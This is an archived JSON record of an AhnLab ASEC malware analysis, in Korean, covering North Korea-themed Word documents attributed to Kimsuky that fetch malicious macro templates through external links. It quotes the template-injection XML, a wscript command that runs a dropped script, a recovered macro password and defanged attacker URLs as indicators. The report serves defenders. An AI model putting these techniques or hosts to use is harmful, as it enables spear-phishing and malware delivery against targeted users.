{
    "id": "a2ce23b6-4e1a-466c-a835-3ade810ee7ba",
    "created_at": "2023-01-12T15:05:39.051453Z",
    "updated_at": "2025-03-27T02:16:55.632903Z",
    "deleted_at": null,
    "sha1_hash": "a20efc864518c1686e854b0d7c5ca25ddd53bb7a",
    "title": "2021-03-22 - 대북관련 본문 내용의 External 링크를 이용한 악성 워드 문서",
    "authors": "",
    "file_creation_date": "2022-05-28T23:10:32Z",
    "file_modification_date": "2022-05-28T23:10:32Z",
    "file_size": 2917803,
    "plain_text": "# 대북관련 본문 내용의 External 링크를 이용한 악성 워드 문서\n\n**asec.ahnlab.com/ko/21359/**\n\n2021년 3월 22일\n\nASEC 분석팀에서는 다양한 형태의 문서형 악성코드들에 대해 소개해왔다. 그 중에서 대북과\n관련한 본문 내용의 악성 문서는 주로 HWP(한글) 형태로 제작되었고 이전 ASEC 블로그에서\n도 그 내용을 확인 할 수 있다. 이번에 소개할 내용은 대북 관련한 본문 내용이 담긴 악성\nDOC(워드) 문서로, ASEC 분석팀에서 확보해온 해당 문서들의 일부를 공개하고자 한다.\n\n메일로 인해 유포되었을 것으로 추정되는 해당 문서들은 아래와 같은 본문 내용을 포함하며,\n문서 내부 XML에 작성된 코드에 ‘외부 External 연결 주소’로 접속하여 추가 문서 파일을 다운\n로드 받는다. XML 내부에 아래 예시와 같이 External로 정의된 외부 URL로 연결할 수 있다.\n최근 들어 유포되는 대북관련 문서들에서 공통적으로 이러한 공격기법이 사용되고 있어서 주\n의가 요구된다.\n\nExternal 공격 예시 (XML 코드 일부)\n\nTarget=”hxxp://www.anpcb.co.kr/plugin/sns/facebook/src/update/normal.dotm?q=6″\nTargetMode=”External“/>\n\n**[문서 1] 파일명 : 질의서.docx**\n\n- External 연결 주소 : hxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?q=6\n\n\n-----\n\n**[문서 2] 파일명 : 업무보고.docx**\n\n- External 연결 주소 : hxxp://koreacit.co.kr/skin/new/basic/update/temp?q=6\n\n\n-----\n\n**[문서 3] 파일명 : 북한 8차** 당대회 평가와 바이든 .docx\n\n- External 연결 주소 : hxxp://www.anpcb.co.kr/plugin/sns/facebook/src/update/normal.dotm?\nq=6\n\n\n-----\n\n**[문서 4] 파일명 : 당대회** 결론.docx\n\n- External 연결 주소 : hxxps://reform-ouen.com/wp-includes/css/dist/nux/dotm/dwn.php?\nid=0119\n\n\n-----\n\n**[문서 5] 파일명 : 2021-0112 종합** 당대회평가.docxx\n\n- External 연결 주소 : hxxps://reform-ouen.com/wp-includes/css/dist/nux/dotm/dwn.php?\nid=0119\n\n\n-----\n\n[문서 1,2,3] 워드에는 보호 기능이 걸려있어 바로 문서 내용을 확인 할 수는 없다. VBA Macro\n가 다운로드 되었을 시 해당 매크로로부터 보호 기능해제가 가능하기 때문이다. 난독화된 매\n크로를 복호화한 결과 문서보호 해제를 위한 비밀번호는 “1qaz2wsx”였다. 아래의 구조로 동작\n하는 것으로 보이는 해당 문서들 중 VBA Macro 워드 파일이 확보된 [문서 1,2]에 대해 설명하\n고자 한다.\n\n[그림1] – 동작 구조\n\n\n-----\n\n[그림2] – [문서 1]의 보호 해제 전 문서 내용\n\n[문서1]은 단독 실행 시 위와 같이 문서가 보호된 형태로 북한 관련 질문 내용을 본문 내용에\n포함하고 있다. 내부에는 추가 악성 매크로 워드 문서를 External을 통해 다운로드 연결하기\n위해 아래와 같은 XML파일을 포함한다.\n\n[그림3] – External 연결 XML\ntarget으로 연결 시도하는 ‘hxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?\nq=6’에서 받아진 문서 파일 또한 워드 문서 형태이며 악성 매크로를 포함한다. 매크로 코드는\n아래와 같이 난독화 되어있으며 실행 시 기본 office 사용자 서식 파일이 위치하는 template 폴\n더에 악성 xml을 생성 후 실행한다. 아래 난독화 된 매크로를 디버깅하는 중간 코드를 캡처한\n것과 같이 생성할 xml 경로와 그 내용을 확인 할 수 있다.\n\n[그림4] – 매크로 디버깅 중간 코드\n\n명령 : wscript.exe //e:vbscript //b C:\\Users\\[사용자\n명]\\AppData\\Roaming\\Microsoft\\Templates\\1589989024.xml\n\n\n-----\n\n[그림5] -1589989024.xml 내용\n위 그림에서 확인 할 수 있듯 생성 된 xml 파일은 추가 악성 네트워크 주소로 접근 시도한다.\n\n[문서 2] 파일 역시 중간 단계의 악성 매크로 워드 파일이 확인 되었는데 동작 구조와 난독화된\n매크로의 형태가 매우 유사한 것으로 보아 동일한 공격자 그룹에 의해 제작되었을 것으로 보\n인다. 두 문서들의 C2를 정리하면 아래와 같으며 최종적으로 추가 악성코드를 다운로드하여\n실행하였을 것으로 추정된다.\n\n[문서 1] 파일명 : 질의서.docx\n\n - XML External접속 후 추가 DOC 문서 다운로드 주소 :\nhxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?q=6\n\n - 위 문서에서 생성한 XML이 추가 접속하는 주소 :\n\nhxxp://heritage2020.cafe24.com/skin/board/gallery/log/list.php?query=1\n\n[문서 2] 파일명 : 업무보고.docx\n\n - XML External접속 후 추가 DOC 문서 다운로드 주소 :\n\nhxxp://koreacit.co.kr/skin/new/basic/update/temp?q=6\n\n - 위 문서에서 생성한 XML이 추가 접속하는 주소 :\n\nhxxp://koreacit.co.kr/skin/new/basic/update/list.php?query=1\n\n위에서 언급한 것과 같이 이러한 문서들은 메일 통해 북한 관련 업무를 수행하는 수신자에게\n보내졌을 가능성이 매우 크다. 스팸 메일을 통한 사회공학적 기법의 공격이 다수 증가한 만큼\n사용자들은 이러한 공격에 피해가 발생하지 않도록 주의를 기울여야 한다.\n\n자사에서는 위와 같은 파일들을 아래와 같이 진단 중이다.\n\n**[파일** 진단]\n\nDownloader/DOC.External\n\nDownloader/XML.Generic\n\nDownloader/DOC.Generic\n\nDownloader/DOC.Agent\n\n**[IOC 정보]**\n\nhxxp://www.inonix.co.kr/kor/board/widgets/mcontent/skins/tmp?q=6\n\nhxxp://heritage2020.cafe24.com/skin/board/gallery/log/list.php?query=1\n\nhxxp://koreacit.co.kr/skin/new/basic/update/temp?q=6\n\n\n-----\n\nhxxp://koreacit.co.kr/skin/new/basic/update/list.php?query=1\nhxxps://reform-ouen.com/wp-includes/css/dist/nux/dotm/dwn.php?id=0119\nhxxp://www.anpcb.co.kr/plugin/sns/facebook/src/update/normal.dotm?q=6\n\n이전 대북 내용의 악성 HWP 파일\n\n‘북한의 회색지대 전략과 대응방안’ 한글문서(HWP) 유포 중 – ASEC BLOG\nASEC 분석팀은 최근 ‘북한의 회색지대 전략과 대응방안’ 내용의 한글 문서 파일이 유포 중인\n것을 확인하였다. 한글문서는 2019년 10월 21일에 작성되었으며, 2020년 6월 23일에 공격자\n에 의해 수정된 것으로 추정된다. 마지막으로 해당 문서를 저장한 사람은 Venus.H로 확인되었\n다. 아래의 그림은 EPS 취약점 스크립트를 포함한 악성 한글문서의 본문 내용을 나타낸다. 북\n한의 회색지대 전략과 대응방안.hwp 해당 한글문서에 대한 문서 정보는 아래와 같다. 문서 정\n보 위의 한글 문서 파일을 열면 취약한 내부에 있는 악성 포…\n\n\n-----\n\nKimsuky 조직 악성 HWP 한글 문서 유포 – ASEC BLOG\n10월 16일 어제 안랩 ASEC 분석팀에 새로운 악성 HWP 한글 문서가 접수되었다. 확인 결과\nKimsuky 조직 유형으로 판단된다. 악성 한글 문서는 한반도의 대북 정책 관련 한미/한중 외교\n에 관한 질문 내용이다. 공격 대상은 정확히 확인되지 않았지만, 관련 전문가 또는 참가자를 대\n상으로 했을 것으로 보인다. 공격자는 CVE-2017-8291 고스트스크립트 취약점을 이용한 악성\nEPS 이미지 포맷 파일을 문서에 삽입(아래 박스로 표기한 부분)하여 악성 기능을 실행하였다.\n파일 정보 파일 타입: 한글 워드프로세서 문서 파일명: …\n\n[Categories:악성코드](https://asec.ahnlab.com/ko/category/malware/) 정보\n\n[Tagged as:ATP,](https://asec.ahnlab.com/tag/atp/) [대북,](https://asec.ahnlab.com/tag/%eb%8c%80%eb%b6%81/) [스팸메일,](https://asec.ahnlab.com/ko/tag/%ec%8a%a4%ed%8c%b8%eb%a9%94%ec%9d%bc/) [phishing](https://asec.ahnlab.com/ko/tag/phishing/)\n\n\n-----",
    "language": "KO",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-03-22 - 대북관련 본문 내용의 External 링크를 이용한 악성 워드 문서.pdf"
    ],
    "report_names": [
        "2021-03-22 - 대북관련 본문 내용의 External 링크를 이용한 악성 워드 문서.pdf"
    ],
    "threat_actors": [
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535939,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1653779432,
    "ts_modification_date": 1653779432,
    "files": {
        "pdf": "https://archive.orkl.eu/a20efc864518c1686e854b0d7c5ca25ddd53bb7a.pdf",
        "text": "https://archive.orkl.eu/a20efc864518c1686e854b0d7c5ca25ddd53bb7a.txt",
        "img": "https://archive.orkl.eu/a20efc864518c1686e854b0d7c5ca25ddd53bb7a.jpg"
    }
}